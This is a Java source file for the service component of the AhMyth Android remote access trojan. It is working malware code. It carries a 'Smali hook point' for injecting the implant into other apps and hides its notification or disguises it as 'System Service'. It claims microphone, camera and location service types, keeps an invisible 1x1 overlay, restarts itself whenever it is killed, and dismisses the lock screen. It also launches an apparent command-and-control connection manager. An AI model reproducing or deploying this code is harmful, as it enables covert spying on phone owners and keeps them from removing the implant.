package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.app.KeyguardManager;
import android.view.WindowManager;

import java.lang.reflect.Method;

public class MainService extends Service {
    
    private static final String TAG = "AhMythService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "ahmyth_service_channel";
    
    // Overlay view for foreground persistence (1px transparent)
    private android.view.WindowManager windowManager;
    private android.view.View overlayView;
    
    private static Context contextOfApplication;
    private PowerManager.WakeLock wakeLock;
    private boolean isRunning = false;

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startService(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startService(context);
        }
    }

    // Smali hook point
    public static void start() {
        try {
            Log.d(TAG, "Static start() called");
            findContext();
        } catch (Exception e) {
            Log.e(TAG, "Error in start()", e);
        }
    }

    public static void startService(Context context) {
        try {
            Log.d(TAG, "startService called");
            Intent intent = new Intent(context, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        contextOfApplication = this;
        
        // Acquire wake lock to keep service running
        acquireWakeLock();
        
        // Create 1px overlay if permission granted
        createOverlay();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        Log.d(TAG, "Service onStartCommand - SDK: " + Build.VERSION.SDK_INT);
        
        // Ensure overlay exists
        if (overlayView == null) {
            createOverlay();
        }

        // Always update context to Service context to avoid holding onto dead Activity context
        try {
            if (ConnectionManager.context instanceof android.app.Activity) {
                Log.d(TAG, "Updating ConnectionManager context to Service context");
                ConnectionManager.context = this;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating context", e);
        }

        if (isRunning) {
            Log.d(TAG, "Service already running");
            return Service.START_STICKY;
        }
        
        isRunning = true;
        contextOfApplication = this;
        
        // Start foreground immediately to prevent ANR
        startForegroundWithNotification();
        
        // Start the connection manager
        try {
            Log.d(TAG, "Starting ConnectionManager");
            ConnectionManager.startAsync(this);
        } catch (Exception e) {
            Log.e(TAG, "Error starting ConnectionManager", e);
        }
        
        return Service.START_STICKY;
    }

    private void startForegroundWithNotification() {
        Log.d(TAG, "Starting foreground notification");
        
        try {
            // Create notification channel for Android 8+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel();
            }
            
            // Build notification - use minimal/silent notification if in stealth mode
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID);
            
            if (StealthConfig.SILENT_NOTIFICATION) {
                // Ultra-minimal notification for stealth
                builder.setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setOngoing(true)
                    .setShowWhen(false)
                    .setAutoCancel(false)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSound(null)
                    .setVibrate(null);
            } else {
                // Normal notification
                builder.setContentTitle("System Service")
                    .setContentText("Running in background")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setOngoing(true)
                    .setShowWhen(false)
                    .setAutoCancel(false);
            }
            
            // Add pending intent to open app
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            } else {
                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_UPDATE_CURRENT);
            }
            builder.setContentIntent(pendingIntent);
            
            Notification notification = builder.build();
            
            // Start foreground with appropriate service type for Android 10+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+ requires specific foreground service types
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10-13
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                // Android 9 and below
                startForeground(NOTIFICATION_ID, notification);
            }
            
            Log.d(TAG, "Foreground notification started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting foreground", e);
            // Fallback for older devices
            try {
                startForeground(NOTIFICATION_ID, new Notification());
            } catch (Exception e2) {
                Log.e(TAG, "Fallback foreground failed", e2);
            }
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Use minimal importance in stealth mode
            int importance = StealthConfig.SILENT_NOTIFICATION ? 
                NotificationManager.IMPORTANCE_MIN : 
                NotificationManager.IMPORTANCE_LOW;
            
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                StealthConfig.SILENT_NOTIFICATION ? " " : "Background Service",
                importance
            );
            
            channel.setDescription("");
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            channel.setBypassDnd(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
                Log.d(TAG, "Notification channel created (stealth: " + StealthConfig.SILENT_NOTIFICATION + ")");
            }
        }
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "AhMyth::ServiceWakeLock"
                );
                wakeLock.acquire(10*60*1000L); // 10 minutes timeout
                Log.d(TAG, "Wake lock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }
    
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "Wake lock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake lock", e);
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        isRunning = false;
        releaseWakeLock();
        
        // Remove overlay
        removeOverlay();
        
        // Schedule restart
        scheduleRestart();
        
        super.onDestroy();
    }
    
    private void createOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && 
                !android.provider.Settings.canDrawOverlays(this)) {
                Log.w(TAG, "Cannot create overlay - permission missing");
                return;
            }
            
            if (overlayView != null) {
                return; // Already created
            }
            
            windowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
            
            int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                android.view.WindowManager.LayoutParams.TYPE_PHONE;
                
            android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                1, 1, // 1x1 pixel
                type,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                android.graphics.PixelFormat.TRANSLUCENT
            );
            
            params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
            params.x = 0;
            params.y = 0;
            // Must be > 0.0 for system to consider it "visible" for some background checks
            // But still invisible to human eye
            params.alpha = 0.01f; 
            
            overlayView = new android.view.View(this);
            overlayView.setBackgroundColor(Color.TRANSPARENT);
            
            windowManager.addView(overlayView, params);
            Log.d(TAG, "1x1 Overlay created successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating overlay", e);
        }
    }
    
    private void removeOverlay() {
        try {
            if (windowManager != null && overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
                Log.d(TAG, "Overlay removed");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error removing overlay", e);
        }
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - scheduling restart");
        scheduleRestart();
    }
    
    private void scheduleRestart() {
        try {
            Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
            restartServiceIntent.setPackage(getPackageName());
            
            PendingIntent restartServicePendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                restartServicePendingIntent = PendingIntent.getService(
                    getApplicationContext(), 1001, restartServiceIntent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
                );
            } else {
                restartServicePendingIntent = PendingIntent.getService(
                    getApplicationContext(), 1001, restartServiceIntent,
                    PendingIntent.FLAG_ONE_SHOT
                );
            }
            
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerTime = System.currentTimeMillis() + 1000;
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    // Android 12+ requires permission for exact alarms
                    if (alarmManager.canScheduleExactAlarms()) {
                        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                    } else {
                        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                    }
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                } else {
                    alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
                }
                
                Log.d(TAG, "Restart scheduled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }
    
    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.w(TAG, "Low memory warning");
    }
    
    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.d(TAG, "Trim memory level: " + level);
    }

    public void wakeScreen() {
        Log.d(TAG, "Waking screen up...");
        try {
            // Get power manager
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager == null) {
                Log.e(TAG, "Failed to get PowerManager");
                return;
            }

            // Acquire a screen-bright wake lock
            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                PowerManager.ON_AFTER_RELEASE,
                "AhMyth::ScreenWakeLock"
            );
            wakeLock.acquire(10000); // 10 second timeout

            // Dismiss keyguard
            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (keyguardManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    keyguardManager.requestDismissKeyguard(null, null);
                } else {
                    KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("AhMyth");
                    keyguardLock.disableKeyguard();
                }
            }

            // Bring MainActivity to front
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);

            // Release wake lock after a short delay
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (wakeLock.isHeld()) {
                    wakeLock.release();
                    Log.d(TAG, "Screen wake lock released");
                }
            }, 5000);

        } catch (Exception e) {
            Log.e(TAG, "Error waking screen", e);
        }
    }
}
